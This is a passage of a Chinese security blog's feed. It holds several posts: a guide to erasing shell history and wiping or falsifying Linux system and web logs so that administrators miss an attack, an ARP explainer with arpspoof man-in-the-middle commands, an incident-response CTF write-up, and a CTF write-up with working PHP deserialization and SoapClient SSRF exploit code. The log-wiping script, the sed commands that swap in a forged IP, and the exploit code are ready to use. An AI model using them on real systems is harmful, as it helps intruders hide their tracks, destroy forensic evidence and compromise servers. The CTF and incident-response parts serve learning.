class="code"><pre><span class="line">:<span class="built_in">set</span> <span class="built_in">history</span>=0</span><br><span class="line">:!<span class="built_in">command</span></span><br></pre></td></tr></table></figure><h3 id="⭐不记录history历史命令"><a href="#⭐不记录history历史命令" class="headerlink" title="⭐不记录history历史命令"></a>⭐不记录history历史命令</h3><p>（1）通过修改配置文件&#x2F;etc&#x2F;profile，使系统不再保存命令记录。</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">HISTSIZE</span>=<span class="number">0</span></span><br></pre></td></tr></table></figure><p><img src="/../images/1964477-20211217110951891-267612086.png" alt="img"></p><p>（2）登录后执行下面命令,不记录历史命令(.bash_history)</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">unset <span class="variable constant_">HISTORY</span> <span class="variable constant_">HISTFILE</span> <span class="variable constant_">HISTSAVE</span> <span class="variable constant_">HISTZONE</span> <span class="variable constant_">HISTORY</span> <span class="variable constant_">HISTLOG</span>; <span class="keyword">export</span> <span class="variable constant_">HISTFILE</span>=<span class="regexp">/dev/</span><span class="literal">null</span>; <span class="keyword">export</span> <span class="variable constant_">HISTSIZE</span>=<span class="number">0</span>; <span class="keyword">export</span> <span class="variable constant_">HISTFILESIZE</span>=<span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="清除系统日志痕迹"><a href="#清除系统日志痕迹" class="headerlink" title="清除系统日志痕迹"></a><strong>清除系统日志痕迹</strong></h3><p>Linux 系统存在多种日志文件，来记录系统运行过程中产生的日志。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/var/run/utmp 记录现在登入的用户，使用w,<span class="built_in">who</span>,<span class="built_in">users</span>等命令查看</span><br><span class="line">/var/log/wtmp 记录用户所有的登入和登出，使用last命令查看</span><br><span class="line">/var/log/lastlog 记录每一个用户最后登入时间，使用lastlog命令查看</span><br><span class="line">/var/log/btmp 记录所有登录失败信息，使用lastb命令查看</span><br><span class="line">/var/log/auth.log 需要身份确认的操作</span><br><span class="line">/var/log/secure 记录安全相关的日志信息</span><br><span class="line">/var/log/maillog 记录邮件相关的日志信息</span><br><span class="line">/var/log/message 记录系统启动后的信息和错误日志</span><br><span class="line">/var/log/cron 记录定时任务相关的日志信息</span><br><span class="line">/var/log/spooler 记录UUCP和news设备相关的日志信息</span><br><span class="line">/var/log/boot.log 记录守护进程启动和停止相关的日志消息</span><br></pre></td></tr></table></figure><h4 id="（1）清空日志文件"><a href="#（1）清空日志文件" class="headerlink" title="（1）清空日志文件"></a>（1）清空日志文件</h4><p>以下几种方式：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /dev/null &gt; filename</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; filename</span><br><span class="line"><span class="built_in">echo</span> &gt; filename</span><br><span class="line">: &gt; filename</span><br><span class="line">&gt; filename</span><br></pre></td></tr></table></figure><p><img src="/../images/1964477-20211217111008639-1871743190.png" alt="img"></p><h4 id="⭐（2）替换-x2F-删除部分日志"><a href="#⭐（2）替换-x2F-删除部分日志" class="headerlink" title="⭐（2）替换&#x2F;删除部分日志"></a>⭐（2）替换&#x2F;删除部分日志</h4><p>日志文件全部被清空，太容易被管理员察觉了，如果只是删除或替换部分关键日志信息，那么就可以完美隐藏攻击痕迹。</p><p>替换：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 192.168.100.101为攻击者IP，10.0.0.55为伪造IP，-i编辑文件</span></span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> -i /var/log/btmp*</span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> -i /var/log/lastlog</span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> -i /var/log/wtmp</span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> -i secure</span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> -i /var/log/utmp</span><br></pre></td></tr></table></figure><p>删除：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip</span></span><br><span class="line">sed  -i <span class="string">&#x27;/自己的ip/&#x27;</span>d  /var/log/messages</span><br><span class="line">sed  -i <span class="string">&#x27;/当天日期/&#x27;</span>d  filename</span><br></pre></td></tr></table></figure><h3 id="一键清除history和系统日志脚本"><a href="#一键清除history和系统日志脚本" class="headerlink" title="一键清除history和系统日志脚本"></a>一键清除history和系统日志脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/syslog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/messages</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/httpd/access_log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/httpd/error_log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/xferlog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/secure</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/auth.log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/user.log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/wtmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/lastlog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/btmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/run/utmp</span><br><span class="line"><span class="built_in">rm</span> ~/./bash_history</span><br><span class="line"><span class="built_in">history</span> -c</span><br></pre></td></tr></table></figure><h3 id="清除web日志痕迹"><a href="#清除web日志痕迹" class="headerlink" title="清除web日志痕迹"></a>清除web日志痕迹</h3><p>web日志同样可以使用sed进行伪造，例如apache日志、MySQL日志、php日志</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> –i /var/<span class="built_in">log</span>/apache/access.<span class="built_in">log</span></span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> –i /var/<span class="built_in">log</span>/apache/error_log</span><br><span class="line"></span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> –i /var/<span class="built_in">log</span>/mysql/mysql_error.<span class="built_in">log</span></span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> –i /var/<span class="built_in">log</span>/mysql/mysql_slow.<span class="built_in">log</span></span><br><span class="line"></span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/192.168.1.4/g&#x27;</span> –i /var/<span class="built_in">log</span>/apache/php_error.<span class="built_in">log</span></span><br></pre></td></tr></table></figure><p>清除部分相关日志：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用grep -v来把我们的相关信息删除</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/nginx/access.log | grep -v evil.php &gt; tmp.log</span><br><span class="line"><span class="comment"># 把修改过的日志覆盖到原日志文件</span></span><br><span class="line"><span class="built_in">cat</span> tmp.log &gt; /var/log/nginx/access.log/</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/1698537">https://cloud.tencent.com/developer/article/1698537</a></p><p><a href="https://www.freebuf.com/articles/system/266458.html">https://www.freebuf.com/articles/system/266458.html</a></p><p><a href="https://www.cnblogs.com/xiaozi/p/13648156.html">https://www.cnblogs.com/xiaozi/p/13648156.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ARP协议</title>
      <link href="/2023/06/01/ARP%E5%8D%8F%E8%AE%AE/"/>
      <url>/2023/06/01/ARP%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="ARP协议是什么"><a href="#ARP协议是什么" class="headerlink" title="ARP协议是什么"></a>ARP协议是什么</h2><p>​ARP 协议是地址解析协议。它的作用是，通过IP地址（身份证号），问出MAC地址（名字）。</p><p>​比如说，一个网络，有A、B、C 和 D四个设备，还有一个特殊的设备，它是路由器。每个设备有 IP 地址和 MAC 地址。</p><p><img src="/../images/1658199491_62d61dc3accbdb9a8b4c3-1694328189527.jpg!small" alt="img"><br>    假设，设备A 需要发送数据包给设备C，设备A的应用程序只知道要发送数据给10.0.2.6这个ip，但是发不出去。</p><p>这是因为，IP地址类似身份证号，在全国范围内，它很好用，但在家庭范围内不灵。MAC类似名字，在全国范围内不灵，但家庭内部，还得靠这个。</p><p>​同样，局域网内部通信，也就是通过普通二层交换机通信，IP(身份证号)不灵，得依靠MAC(名字)。A必须知道10.0.2.6的MAC地址，才能将数据包发送出去。然而，设备A怎么知道设备C的MAC呢？这就要依靠 ARP 协议。</p><h2 id="ARP协议如何实现"><a href="#ARP协议如何实现" class="headerlink" title="ARP协议如何实现"></a>ARP协议如何实现</h2><p>​设备A发送一个广播包，它就是ARP 包，问所有设备： 10.0.2.6(身份证号)是谁的？或许有善于思考的人会问，此时A不知道其他机器的mac地址，怎么发数据包？我回答：广播包是普发，既然普发，当然无需知道接收方的mac地址。</p><p><img src="/../images/1658199518_62d61ddead52e7492752c-1694328193352.jpg!small" alt="img"><br>    其他设备都不予理睬，设备C知道自己的IP是10.0.2.6，所以，它立即做出回应。</p><p>​正常情况下，其他的设备都默不作声，只有设备C，它会发出应答包。善于思考的人此时又会问：C不知道A的mac地址，怎么回应？错：A发送的广播包中带有自己的mac地址，所以，C此时已经有了A的mac地址。回应包就像一张身份证：一行是身份证号ip，下一行是姓名mac。就这样，设备A通过询问，拿到了设备C的MAC，二者就可以在局域网中进行通信了。</p><p><img src="/../images/1658199555_62d61e035ce70a9b1f624-1694328196273.jpg!small" alt="img"><br>    这里就出现另一个问题：是不是每发送一次都得经过广播 -&gt; 封装 ARP 响应 -&gt; 返回给主机这一系列流程呢？</p><p>​答案是：ARP表</p><p>​主机通过把第一次 ARP 获取到的 MAC 地址作为 IP 对 MAC 的映射关系到一个 ARP 缓存表中，下一次再向这个地址发送数据报时就不再需要重新发送 ARP 请求了，而是直接使用这个缓存表中的 MAC 地址进行数据报的发送。</p><h2 id="ARP数据包"><a href="#ARP数据包" class="headerlink" title="ARP数据包"></a>ARP数据包</h2><p>实验环境：宿主机window10，虚拟机kaii（net连接）</p><p>工具：wireshark</p><p>选择捕获VMnet8网卡。</p><p>在宿主机上<code>ping 192.168.244.128</code> （ping 虚拟机ip地址），过滤ARP协议得到</p><p><img src="/../images/image-20220929154825833-1694328200254.png" alt="image-20220929154825833"></p><p>可以看到info的信息其实就告诉我们了ARP协议是用来干嘛的。</p><p>数据包内容，以ARP请求为例：</p><p><img src="/../images/image-20220929155056878-1694328203114.png" alt="image-20220929155056878"></p><ol><li><p>第一帧描述了ARP数据包的长度，时间，类型等信息。</p><p><img src="/../images/image-20220929155151496.png" alt="image-20220929155056878"></p></li><li><p>第二帧描述了源mac地址和目标mac地址</p><p>其中目的地址<code>ff:ff:ff:ff:ff:ff</code>为广播地址</p><p><img src="/../images/image-20220929155258245.png" alt="image-20220929155056878"></p></li><li><p>第三帧</p><blockquote><p>引用图片</p></blockquote><p><img src="/../images/1657258276_62c7c1240a8a324d48f7b-1694328215300.png!small" alt="1657258276_62c7c1240a8a324d48f7b.png!small"></p></li></ol><p>ARP响应包主要不同点就在于ARP数据包类型以及源，目标地址。</p><p><img src="/../images/image-20220929155642126-1694328218908.png" alt="image-20220929155642126"></p><h2 id="ARP协议探测主机"><a href="#ARP协议探测主机" class="headerlink" title="ARP协议探测主机"></a>ARP协议探测主机</h2><blockquote><p>因为ARP的工作流程，所以可以用来探测主机。</p></blockquote><p>使用netdiscover工具进行探测</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.244.1/24</span><br></pre></td></tr></table></figure><p>下图为另一台虚拟机ubuntu的ip地址</p><p><img src="/../images/image-20220929150651695-1694328222991.png" alt="image-20220929150651695"></p><p>下图为命令执行结果</p><p><img src="/../images/image-20220929150631230-1694328225340.png" alt="image-20220929150631230"></p><p>192.168.244.1为本机</p><p>192.168.244.2为VM网关</p><p>192.168.244.129为同一局域网下的主机</p><p>192.168.244.254为VM？</p><h2 id="ARP攻击"><a href="#ARP攻击" class="headerlink" title="ARP攻击"></a>ARP攻击</h2><h3 id="欺骗攻击"><a href="#欺骗攻击" class="headerlink" title="欺骗攻击"></a>欺骗攻击</h3><h4 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h4><p>ARP的特性</p><blockquote><p>设备就算没有主动去询问（发广播包），也会接收别人主动发来的身份诊卡（ARP回应包）。</p><p>并且接收时不会去判断真假，而是直接保存到ARP表中。</p></blockquote><h4 id="欺骗主机"><a href="#欺骗主机" class="headerlink" title="欺骗主机"></a>欺骗主机</h4><p>Victim：虚拟机ububtu正常联网</p><p><img src="/../images/image-20220929151256047-1694328229283.png" alt="image-20220929151256047"></p><p>hacker：kali机使用arpspoof工具进行ARP欺骗攻击</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arpspoof -i 网卡名 -t  目标主机  路由器</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220929151906826-1694328232862.png" alt="image-20220929151906826"></p><p>命令的结果就是让Victim的ARP表中存储的路由器mac地址变为hacker的mac地址，即发送的数据包会到hacker主机，而不是到路由器。</p><p>从下图可以看到victim无法访问网站，并且通过命令<code>arp -a</code>查看ARP表会发现VM网关（192.168.244.2）的mac地址和hacker的mac地址是一样的，所以ARP欺骗攻击成功了。</p><p><img src="/../images/image-20220929151847725-1694328235790.png" alt="image-20220929151847725"></p><h4 id="中间人攻击–欺骗网关和主机"><a href="#中间人攻击–欺骗网关和主机" class="headerlink" title="中间人攻击–欺骗网关和主机"></a>中间人攻击–欺骗网关和主机</h4><p>​在上面的基础上，hacker还可以再对路由器进行ARP欺骗攻击，让路由器中Victim的ip所对应的MAC地址变为hacker的MAC地址，这样当Victim发送数据包的时候就会先发送到hacker手上，hacker可以把数据包再给路由器，当路由器收到响应的数据包时，就会转发给hacker，这样hacker就能够监控并更改Victim的通信了。</p><p><img src="/../images/1658199907_62d61f63394a1350fb977-1694328238721.jpg!small" alt="img"></p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul><li>绑定mac地址</li><li>使用静态arp缓存表</li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.freebuf.com/vuls/338603.html">ARP协议</a></p><p><a href="https://www.freebuf.com/articles/network/339512.html">ARP欺骗</a></p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机网络</title>
      <link href="/2023/06/01/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
      <url>/2023/06/01/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<p><a href="https://wxler.github.io/2021/02/02/221724/">https://wxler.github.io/2021/02/02/221724/</a></p><p>VM网络配置</p><p><img src="/../images/image-20221130222647414-1694328507984.png" alt="image-20221004160123895"></p><p>虚拟机win10打印的网络配置信息</p><p><img src="/../images/image-20221130222502342-1694328517756.png" alt="image-20221004160123895"></p><p>宿主机网络设备</p><p><img src="/../images/image-20221130223635941-1694328542057.png" alt="image-20221004160123895"></p><p>NAT模式</p><p><img src="/../images/20210202174313-1694328313538.png" alt="img"></p><p>桥接模式</p><p><img src="/../images/20210202175608-1694328316191.png" alt="img"></p><p>仅主机模式</p><p><img src="/../images/20210202181232-1694328318816.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>bugku 应急响应</title>
      <link href="/2023/05/31/bugku%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>/2023/05/31/bugku%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<h3 id="js劫持"><a href="#js劫持" class="headerlink" title="js劫持"></a>js劫持</h3><p><img src="/../images/image-20230402174621652-1686151030355.png" alt="image-20230402174621652"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat `find /var/www/html -name &quot;6127418cad73c.php&quot;`</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230402174633296-1686151030358.png" alt="image-20230402174633296"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find . | xargs grep -ri &#x27;&lt;script type=&quot;text/javascript&quot;&gt;&#x27; -l | sort | uniq -c</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过xss的特征内容来定位可疑文件</p><h3 id="反弹shell后门"><a href="#反弹shell后门" class="headerlink" title="反弹shell后门"></a>反弹shell后门</h3><p><img src="/../images/image-20230402180138838-1686151030359.png" alt="image-20230402180138838"></p><p><img src="/../images/image-20230402180201438-1686151030359.png" alt="image-20230402180201438"></p><p>处理：</p><p>删除文件</p><p>杀掉进程</p><h3 id="命令劫持"><a href="#命令劫持" class="headerlink" title="命令劫持"></a>命令劫持</h3><p><img src="/../images/image-20230402180338299-1686151030359.png" alt="image-20230402180338299"></p><h3 id="数据库修复"><a href="#数据库修复" class="headerlink" title="数据库修复"></a>数据库修复</h3><p><a href="https://www.cnblogs.com/richardzhu/p/3318595.html">MySQL之权限管理 - I’m Me! - 博客园</a></p><p><img src="/../images/image-20230402181706798-1686151030359.png" alt="image-20230402181706798"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">revoke file on *.* from &#x27;root&#x27;@&#x27;localhost&#x27;; # 收回文件权限</span><br><span class="line">set global general_log = off; # 不启用日志</span><br><span class="line">flush privileges; # 刷新权限</span><br></pre></td></tr></table></figure><h3 id="用户删除"><a href="#用户删除" class="headerlink" title="用户删除"></a>用户删除</h3><p><img src="/../images/image-20230402183352852-1686151030359.png" alt="image-20230402183352852"></p><p>直接删就完事了</p><h3 id="首次攻击"><a href="#首次攻击" class="headerlink" title="首次攻击"></a>首次攻击</h3><p>筛选了ip和状态码，然后找的。</p><p><img src="/../images/image-20230402190333789-1686151030360.png" alt="image-20230402190333789"></p><p><img src="/../images/image-20230403114840046-1686151030360.png" alt="image-20230403114840046"></p><p><img src="/../images/image-20230403114851126-1686151030360.png" alt="image-20230403114851126"></p><p>发现安装了phpmyadmin，那么很大概率是通过数据库攻入的。</p><p><img src="/../images/image-20230403115435870-1686151030360.png" alt="image-20230403115435870"></p><p>登录phpmyadmin后台查看二进制日志，很明显看出来这个是使用udf创建恶意函数sys_eval提权</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查看这些目录是否有文件，很可能有提权</span><br><span class="line">mysql\lib\plugin</span><br><span class="line"></span><br><span class="line">c:<span class="operator">/</span>windows<span class="operator">/</span>system32<span class="operator">/</span>wbem<span class="operator">/</span>mof<span class="operator">/</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230403115606245-1686151030360.png" alt="image-20230403115606245"></p><p>修复</p><p><img src="/../images/image-20230403123447079-1686151030360.png" alt="image-20230403123447079"></p><p>在my.ini中添加如上设置，不允许导入和导出。</p><p>进行mysql日志分析，通过定位sys_eval来查找攻击者进行了哪些操作</p><p><img src="/../images/image-20230403120034903-1686151030360.png" alt="image-20230403120034903"></p><p>只进行了添加用户的操作</p><p><img src="/../images/image-20230403120253606-1686151030360.png" alt="image-20230403120253606"></p><p>直接删除该用户</p><p><img src="/../images/image-20230403120327311-1686151030360.png" alt="image-20230403120327311"></p><p>查杀websehll</p><p>使用日志分析工具</p><p>（跟踪ip的访问）</p><p><img src="/../images/image-20230403122636304-1686151030360.png" alt="image-20230403122636304"></p><p><img src="/../images/image-20230403122604222-1686151030360.png" alt="image-20230403122604222"></p><p>后门查杀</p><p><img src="/../images/image-20230403124818101-1686151030361.png" alt="image-20230403124818101"></p><p><img src="/../images/image-20230403124754804-1686151030361.png" alt="image-20230403124754804"></p><p>木马位置在启动项</p><p><img src="/../images/image-20230403124903028-1686151030361.png" alt="image-20230403124903028"></p><p><img src="/../images/image-20230403124408821-1686151030361.png" alt="image-20230403124408821"></p><p>通过资源监视器得到该木马外联地址</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2022 安洵杯</title>
      <link href="/2023/05/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/"/>
      <url>/2023/05/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>与buu–bestphp‘s revenge差不多</p><ul><li>session+反序列化</li><li>原生类SSRF+文件操作</li></ul><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>第一步，设置php的session解析器，使得下一次会话时session中保存的是构造好的SoapClient对象。</p><p>SoapClient对象</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># $target = &quot;http://127.0.0.1/flag.php?a=GlobIterator&amp;b=/f*&quot;; 查找flag文件名</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/flag.php?a=SplFileObject&amp;b=/f1111llllllaagg&quot;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=123456789&#x27;</span> <span class="comment"># 随便给一个</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">  <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;khaz^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128162813314-1686150400485.png" alt="image-20221128162813314"></p><p>第二步，反序列化触发SoapClient的call方法，从而导致SSRF，从而将flag保存到SSRF请求对应的session中。</p><p>pop：</p><p>B::destruct   →    C::toString   →   A::invoke    →   C::uwant</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;babyhacker&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发invoke\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;a) &amp;&amp; <span class="variable language_">$this</span>-&gt;a == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">uwant</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$k</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发destruct\n&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;k;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;getflag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发toString\n&quot;</span>;</span><br><span class="line">        <span class="variable">$cc</span> = <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$cc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uwant</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发uwant\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;a == <span class="string">&quot;phpinfo&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>), <span class="variable">$this</span>-&gt;a));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$c2</span> =<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;c = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="string">&quot;0e215962017&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;b = <span class="variable">$c2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">// echo $result;</span></span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:1:&quot;A&quot;:2:&#x27;</span>, <span class="string">&#x27;O:1:&quot;A&quot;:3:&#x27;</span>,<span class="variable">$result</span>);<span class="comment">//绕过__wakeup()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$x</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128163059684-1686150400486.png" alt="image-20221128163059684"></p><p>这里的500是因为C::tostring()的报错，而不是反序列化出错。</p><img src="E:\typora img\image-20221128163329919.png" alt="image-20221128163329919" style="zoom:67%;" 